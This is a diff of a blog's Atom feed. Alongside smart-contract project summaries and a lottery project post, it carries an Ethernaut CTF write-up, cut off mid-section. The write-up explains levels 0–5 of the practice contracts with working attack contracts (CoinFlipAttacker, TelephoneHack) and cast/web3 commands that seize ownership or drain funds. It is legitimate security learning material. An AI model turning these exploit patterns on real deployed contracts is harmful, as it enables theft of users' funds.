+&lt;h2 id=&quot;fund-me&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#fund-me&quot; aria-label=&quot;Anchor link for: fund-me&quot;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;4l0n3r&#x2F;fund-me&quot;&gt;fund-me&lt;&#x2F;a&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;A beginner-friendly smart contract where users can contribute ETH, featuring owner withdrawal logic and Chainlink price feeds.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;lottery&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#lottery&quot; aria-label=&quot;Anchor link for: lottery&quot;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;4l0n3r&#x2F;lottery&quot;&gt;lottery&lt;&#x2F;a&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;A decentralized lottery system using Chainlink VRF to select random winners fairly.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;foundry-dao&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#foundry-dao&quot; aria-label=&quot;Anchor link for: foundry-dao&quot;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;4l0n3r&#x2F;foundry-dao&quot;&gt;foundry-dao&lt;&#x2F;a&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;A full-stack DAO implementation that enables proposal creation, voting, and treasury control through smart contracts.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;foundry-dao-cu&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#foundry-dao-cu&quot; aria-label=&quot;Anchor link for: foundry-dao-cu&quot;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;4l0n3r&#x2F;foundry-dao-cu&quot;&gt;foundry-dao-cu&lt;&#x2F;a&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;A refined DAO version focused on custom governance and unit testing coverage in Foundry.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;foundry-upgradable-contract&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#foundry-upgradable-contract&quot; aria-label=&quot;Anchor link for: foundry-upgradable-contract&quot;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;4l0n3r&#x2F;foundry-upgradable-contract&quot;&gt;foundry-upgradable-contract&lt;&#x2F;a&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;A project demonstrating how to create upgradable smart contracts using the proxy pattern in Foundry.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;defi-stablecoin&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#defi-stablecoin&quot; aria-label=&quot;Anchor link for: defi-stablecoin&quot;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;4l0n3r&#x2F;defi-stablecoin&quot;&gt;defi-stablecoin&lt;&#x2F;a&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;A minimal DeFi stablecoin system with CDP (collateralized debt position) mechanisms and liquidation logic.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;merkle-airdrop&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#merkle-airdrop&quot; aria-label=&quot;Anchor link for: merkle-airdrop&quot;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;4l0n3r&#x2F;merkle-airdrop&quot;&gt;merkle-airdrop&lt;&#x2F;a&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;A Merkle tree-based airdrop contract that allows users to claim tokens securely and efficiently.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;account-abstraction&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#account-abstraction&quot; aria-label=&quot;Anchor link for: account-abstraction&quot;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;4l0n3r&#x2F;account-abstraction&quot;&gt;account-abstraction&lt;&#x2F;a&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;Implementation of Ethereum’s account abstraction (EIP-4337) with a custom smart wallet and bundler logic.&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;p&gt;More projects coming soon. Stay tuned!&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Decentralized Lottery using Solidity</title>
+        <published>2024-06-17T00:00:00+00:00</published>
+        <updated>2024-06-17T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Unknown
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://4l0n3r.github.io/projects/decentralized-lottery/"/>
+        <id>https://4l0n3r.github.io/projects/decentralized-lottery/</id>
+        
+        <content type="html" xml:base="https://4l0n3r.github.io/projects/decentralized-lottery/">&lt;p&gt;This project implements a decentralized lottery system using Solidity and the Foundry framework. The randomness for winner selection is powered by &lt;a href=&quot;https:&#x2F;&#x2F;docs.chain.link&#x2F;vrf&quot;&gt;Chainlink VRF&lt;&#x2F;a&gt;, ensuring fairness and transparency.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;tools-features&quot;&gt;🛠 Features&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Participants enter the lottery by paying a fixed entrance fee (in ETH).&lt;&#x2F;li&gt;
+&lt;li&gt;A Chainlink VRF (Verifiable Random Function) is used to pick a truly random winner.&lt;&#x2F;li&gt;
+&lt;li&gt;The winner receives the total accumulated ETH in the contract.&lt;&#x2F;li&gt;
+&lt;li&gt;The contract automatically resets for a new round after a winner is selected.&lt;&#x2F;li&gt;
+&lt;li&gt;Integrated with mock contracts for local testing and forked mainnet simulations.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;package-tech-stack&quot;&gt;📦 Tech Stack&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Solidity&lt;&#x2F;strong&gt; for smart contract logic&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Foundry&lt;&#x2F;strong&gt; for development and testing&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Chainlink VRF&lt;&#x2F;strong&gt; for randomness&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Hardhat (optional)&lt;&#x2F;strong&gt; for simulation&#x2F;testing&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Remix&lt;&#x2F;strong&gt; for contract interaction in browser&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;test-tube-test-coverage&quot;&gt;🧪 Test Coverage&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Full test suite using Forge (Foundry).&lt;&#x2F;li&gt;
+&lt;li&gt;Mocks are used to simulate Chainlink services locally.&lt;&#x2F;li&gt;
+&lt;li&gt;Tests include edge cases like:
+&lt;ul&gt;
+&lt;li&gt;Multiple entries&lt;&#x2F;li&gt;
+&lt;li&gt;Time interval restrictions&lt;&#x2F;li&gt;
+&lt;li&gt;VRF fulfillment logic&lt;&#x2F;li&gt;
+&lt;li&gt;ETH transfer assertions&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;rocket-deployment&quot;&gt;🚀 Deployment&lt;&#x2F;h3&gt;
+&lt;p&gt;Deployed and tested on the Sepolia testnet. Chainlink VRF subscription was used with mocks and real coordinator.&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;p&gt;Check out the source code and try your luck 🎲: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;4l0n3r&#x2F;lottery&quot;&gt;GitHub Repo&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Ethernaut Challenge Solutions</title>
+        <published>2024-06-03T00:00:00+00:00</published>
+        <updated>2024-06-03T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Unknown
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://4l0n3r.github.io/writeups/ethernaut-ctf/"/>
+        <id>https://4l0n3r.github.io/writeups/ethernaut-ctf/</id>
+        
+        <content type="html" xml:base="https://4l0n3r.github.io/writeups/ethernaut-ctf/">&lt;p&gt;Hello peeps, recently have started learning things about blockchain.Most probably ethernaut would be the first place where people will land to get their hands dirty. I too landed here and I have noted things that I learned through out this CTF challenges.&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;introduction&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#introduction&quot; aria-label=&quot;Anchor link for: introduction&quot;&gt;Introduction&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;Ethernaut is a foundational platform for hands-on smart contract security practice. Below are my solutions for the first two challenges, highlighting key vulnerabilities and attack vectors.&lt;br &#x2F;&gt;
+Everytime you got a challenge, start with a click on &lt;code&gt;Get new instance&lt;&#x2F;code&gt;. Once you done with it click on &lt;code&gt;Submit level&lt;&#x2F;code&gt; option.&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;0-hello-ethernaut&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#0-hello-ethernaut&quot; aria-label=&quot;Anchor link for: 0-hello-ethernaut&quot;&gt;0: Hello Ethernaut&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;&lt;strong&gt;Link:&lt;&#x2F;strong&gt; &lt;a href=&quot;https:&#x2F;&#x2F;ethernaut.openzeppelin.com&#x2F;level&#x2F;0&quot;&gt;Hello Ethernaut Challenge&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;
+&lt;strong&gt;Bug:&lt;&#x2F;strong&gt; Sensitive data exposure&lt;br &#x2F;&gt;
+&lt;strong&gt;Objective:&lt;&#x2F;strong&gt; Familiarize yourself with contract interaction via the browser console&lt;br &#x2F;&gt;
+&lt;strong&gt;Steps:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;As they mentioned in the problem statement,let&#x27;s open the console tab and execute &lt;code&gt;await contract.info()&lt;&#x2F;code&gt;. let move forward with response it gives back&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;&lt;img src=&quot;..&#x2F;writeup-images&#x2F;eth-1.png&quot; alt=&quot;eth-1.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Note:&lt;&#x2F;strong&gt; You might be wondering how can I know that I need to execute the &lt;code&gt;await contract.password()&lt;&#x2F;code&gt; to get the password to authenticate. I strongly believe there might be a variable exist which is being checked in authenticate function. So I checked all the function and variables available in contract with the help of console suggestion whenever we add &lt;code&gt;await contract&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;1-fallback&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#1-fallback&quot; aria-label=&quot;Anchor link for: 1-fallback&quot;&gt;1: Fallback&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;&lt;strong&gt;Link:&lt;&#x2F;strong&gt; &lt;a href=&quot;https:&#x2F;&#x2F;ethernaut.openzeppelin.com&#x2F;level&#x2F;1&quot;&gt;Fallback Challenge&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;
+&lt;strong&gt;Bug:&lt;&#x2F;strong&gt; Improper ownership transfer in receive() function.&lt;br &#x2F;&gt;
+&lt;strong&gt;Objective:&lt;&#x2F;strong&gt; Become the owner and drain the contract’s funds.&lt;br &#x2F;&gt;
+&lt;strong&gt;Description:&lt;&#x2F;strong&gt; The ownership will be given to the user who contributes more through &lt;code&gt;contribute()&lt;&#x2F;code&gt; function. But in the fallback function, I mean in the receive() function it is giving the ownership if you just send more than 0 eth and if you already contributed more than 0 eth using contribute() function.&lt;br &#x2F;&gt;
+&lt;strong&gt;Steps:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;make a call to contribute() function to contribute some eth.&lt;&#x2F;li&gt;
+&lt;li&gt;now make a call to receive() function with some eth&lt;&#x2F;li&gt;
+&lt;li&gt;call withdraw function to get all the funds from contract.&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;&lt;strong&gt;Using Console:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;    web3.eth.sendTransaction(
+&lt;&#x2F;span&gt;&lt;span&gt;        {
+&lt;&#x2F;span&gt;&lt;span&gt;            from: player,
+&lt;&#x2F;span&gt;&lt;span&gt;            to: contract.address,
+&lt;&#x2F;span&gt;&lt;span&gt;            data: web3.eth.abi.encodeFunctionSignature(&amp;quot;contribute()&amp;quot;),
+&lt;&#x2F;span&gt;&lt;span&gt;            value: 10**10
+&lt;&#x2F;span&gt;&lt;span&gt;        
+&lt;&#x2F;span&gt;&lt;span&gt;        }
+&lt;&#x2F;span&gt;&lt;span&gt;    )
+&lt;&#x2F;span&gt;&lt;span&gt;    
+&lt;&#x2F;span&gt;&lt;span&gt;    web3.eth.sendTransaction(
+&lt;&#x2F;span&gt;&lt;span&gt;        {
+&lt;&#x2F;span&gt;&lt;span&gt;            from: player,
+&lt;&#x2F;span&gt;&lt;span&gt;            to: contract.address,
+&lt;&#x2F;span&gt;&lt;span&gt;            data: &amp;#39;&amp;#39;,
+&lt;&#x2F;span&gt;&lt;span&gt;            value: 10**10
+&lt;&#x2F;span&gt;&lt;span&gt;        }
+&lt;&#x2F;span&gt;&lt;span&gt;    )
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;Using Foundry:&lt;&#x2F;strong&gt;
+I usually use foundry. In foundry setup, we have a tool called &lt;code&gt;cast&lt;&#x2F;code&gt; to interact with contracts. You can follow the below commands.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;    cast send 0x678be0dE93C246b60d05b0dC53E03c226A77bE0E &amp;quot;contribute()&amp;quot; --value 1 --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_U
+&lt;&#x2F;span&gt;&lt;span&gt;    cast send 0x678be0dE93C246b60d05b0dC53E03c226A77bE0E  --value 1 --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
+&lt;&#x2F;span&gt;&lt;span&gt;    cast send 0x678be0dE93C246b60d05b0dC53E03c226A77bE0E &amp;quot;withdraw()&amp;quot; --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h1 id=&quot;2-fal1out&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-fal1out&quot; aria-label=&quot;Anchor link for: 2-fal1out&quot;&gt;2: Fal1out&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;&lt;strong&gt;Link:&lt;&#x2F;strong&gt; &lt;a href=&quot;https:&#x2F;&#x2F;ethernaut.openzeppelin.com&#x2F;level&#x2F;2&quot;&gt;Fal1out Challenge&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;
+&lt;strong&gt;Bug:&lt;&#x2F;strong&gt; Improper ownership transfer in Fal1out() function.&lt;br &#x2F;&gt;
+&lt;strong&gt;Objective:&lt;&#x2F;strong&gt; Become the owner and drain the contract’s funds.&lt;br &#x2F;&gt;
+&lt;strong&gt;Description:&lt;&#x2F;strong&gt; The ownership will be given to the user who calls the &lt;code&gt;Fal1out()&lt;&#x2F;code&gt; function. They missed to have the contructor name same as contract name, where it&#x27;s giving ownership permissions to the creator.&lt;br &#x2F;&gt;
+&lt;strong&gt;Steps:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;call the &lt;strong&gt;Fal1out()&lt;&#x2F;strong&gt; function.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;&lt;strong&gt;Using Console:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;  await contract.Fal1out()
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;Using Foundry:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;cast call 0xb685F5c3aCdb5D874D3e1219D8a4FDF08a502c6E  &amp;quot;Fal1out()&amp;quot; --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h1 id=&quot;3-coin-flip&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#3-coin-flip&quot; aria-label=&quot;Anchor link for: 3-coin-flip&quot;&gt;3: Coin Flip&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;&lt;strong&gt;Link:&lt;&#x2F;strong&gt; &lt;a href=&quot;https:&#x2F;&#x2F;ethernaut.openzeppelin.com&#x2F;level&#x2F;3&quot;&gt;Coin Flip Challenge&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;
+&lt;strong&gt;Bug:&lt;&#x2F;strong&gt; Pseudo-randomness using predictable blockchain data&lt;br &#x2F;&gt;
+&lt;strong&gt;Objective:&lt;&#x2F;strong&gt; Correctly predict 10 consecutive coin flips&lt;br &#x2F;&gt;
+&lt;strong&gt;Description:&lt;&#x2F;strong&gt; Coin flip is based the block.number which is known publicly.&lt;br &#x2F;&gt;
+&lt;strong&gt;Steps:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Create an attack contract that performs the same calculation&lt;&#x2F;li&gt;
+&lt;li&gt;Determine the correct answer before submitting&lt;&#x2F;li&gt;
+&lt;li&gt;Call the flip function 10 times consecutively&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
+&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.0;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;interface ICoinFlip {
+&lt;&#x2F;span&gt;&lt;span&gt;    function flip(bool _guess) external returns (bool);
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;contract CoinFlipAttacker {
+&lt;&#x2F;span&gt;&lt;span&gt;    ICoinFlip public target;
+&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    constructor(address _target) {
+&lt;&#x2F;span&gt;&lt;span&gt;        target = ICoinFlip(_target);
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    function attack() external {
+&lt;&#x2F;span&gt;&lt;span&gt;        uint256 blockValue = uint256(blockhash(block.number - 1));
+&lt;&#x2F;span&gt;&lt;span&gt;        uint256 coinFlip = blockValue &#x2F; FACTOR;
+&lt;&#x2F;span&gt;&lt;span&gt;        bool guess = coinFlip == 1 ? true : false;
+&lt;&#x2F;span&gt;&lt;span&gt;        target.flip(guess);
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;Consecutive calls using Foundry:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;$ cast call 0xdb0DdE6d17A9d17f57238e6CE66328eC5E28C77A &amp;quot;attack()&amp;quot; --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h1 id=&quot;4-telephone&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#4-telephone&quot; aria-label=&quot;Anchor link for: 4-telephone&quot;&gt;4: Telephone&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;&lt;strong&gt;Link:&lt;&#x2F;strong&gt; &lt;a href=&quot;https:&#x2F;&#x2F;ethernaut.openzeppelin.com&#x2F;level&#x2F;4&quot;&gt;Telephone Challenge&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;
+&lt;strong&gt;Bug:&lt;&#x2F;strong&gt; Incorrect ownership validation using &lt;code&gt;tx.origin&lt;&#x2F;code&gt;&lt;br &#x2F;&gt;
+&lt;strong&gt;Objective:&lt;&#x2F;strong&gt; Claim contract ownership&lt;br &#x2F;&gt;
+&lt;strong&gt;Description:&lt;&#x2F;strong&gt; The contract checks &lt;code&gt;tx.origin != msg.sender&lt;&#x2F;code&gt;, which can be bypassed through an intermediary contract.&lt;br &#x2F;&gt;
+&lt;strong&gt;Vulnerability Analysis 🔍:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;function changeOwner(address _owner) public {
+&lt;&#x2F;span&gt;&lt;span&gt;  if (tx.origin != msg.sender) {  &#x2F;&#x2F; Vulnerable check
+&lt;&#x2F;span&gt;&lt;span&gt;    owner = _owner;
+&lt;&#x2F;span&gt;&lt;span&gt;  }
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;Steps:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Deploy an intermediary contract that calls changeOwner()&lt;&#x2F;li&gt;
+&lt;li&gt;Trigger the call from your EOA through this contract&lt;&#x2F;li&gt;
+&lt;li&gt;Bypass the check because:
+&lt;ul&gt;
+&lt;li&gt;tx.origin = Your wallet address&lt;&#x2F;li&gt;
+&lt;li&gt;msg.sender = Attack contract address&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
+&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.0;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;interface ITelephone {
+&lt;&#x2F;span&gt;&lt;span&gt;    function changeOwner(address _owner) external;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;contract TelephoneHack {
+&lt;&#x2F;span&gt;&lt;span&gt;    ITelephone public immutable target;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    constructor(address _target) {
+&lt;&#x2F;span&gt;&lt;span&gt;        target = ITelephone(_target);
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    function attack(address _newOwner) external {
+&lt;&#x2F;span&gt;&lt;span&gt;        target.changeOwner(_newOwner);
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;Execution steps:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;# 1. Deploy attacker contract
+&lt;&#x2F;span&gt;&lt;span&gt;forge create TelephoneHack --constructor-args $TARGET_CONTRACT --private-key $PRIVATE_KEY --rpc-url $RPC_URL
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;# 2. Execute attack (replace $ATTACKER_CONTRACT with deployed address)
+&lt;&#x2F;span&gt;&lt;span&gt;cast send $ATTACKER_CONTRACT &amp;quot;attack(address)&amp;quot; $YOUR_WALLET_ADDRESS \
+&lt;&#x2F;span&gt;&lt;span&gt;  --private-key $PRIVATE_KEY --rpc-url $RPC_URL
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h1 id=&quot;5-token&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#5-token&quot; aria-label=&quot;Anchor link for: 5-token&quot;&gt;5: Token&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;&lt;strong&gt;Link:&lt;&#x2F;strong&gt; &lt;a href=&quot;https:&#x2F;&#x2F;ethernaut.openzeppelin.com&#x2F;level&#x2F;5&quot;&gt;Token Challenge&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;
+&lt;strong&gt;Bug:&lt;&#x2F;strong&gt; Integer underflow vulnerability&lt;br &#x2F;&gt;
+&lt;strong&gt;Objective:&lt;&#x2F;strong&gt; Increase your token balance beyond initial allocation&lt;br &#x2F;&gt;
+&lt;strong&gt;Description:&lt;&#x2F;strong&gt; The contract uses outdated Solidity version (0.6.0) without overflow protection.&lt;br &#x2F;&gt;
+&lt;strong&gt;Vulnerability Analysis:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;function transfer(address _to, uint _value) public returns (bool) {
+&lt;&#x2F;span&gt;&lt;span&gt;  require(balances[msg.sender] - _value &amp;gt;= 0);  &#x2F;&#x2F; Vulnerable check
+&lt;&#x2F;span&gt;&lt;span&gt;  balances[msg.sender] -= _value;              &#x2F;&#x2F; Potential underflow
+&lt;&#x2F;span&gt;&lt;span&gt;  balances[_to] += _value;
+&lt;&#x2F;span&gt;&lt;span&gt;  return true;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;How Integer Limits Work ?
+&lt;ul&gt;
+&lt;li&gt;Ethereum uses &lt;strong&gt;unsigned integers (uint256)&lt;&#x2F;strong&gt; with range:&lt;br &#x2F;&gt;
+&lt;code&gt;0&lt;&#x2F;code&gt; to &lt;code&gt;2²⁵⁶ - 1&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;When arithmetic exceeds these limits, it &lt;strong&gt;wraps around&lt;&#x2F;strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Overflow:&lt;&#x2F;strong&gt; &lt;code&gt;MAX + 1 → 0&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
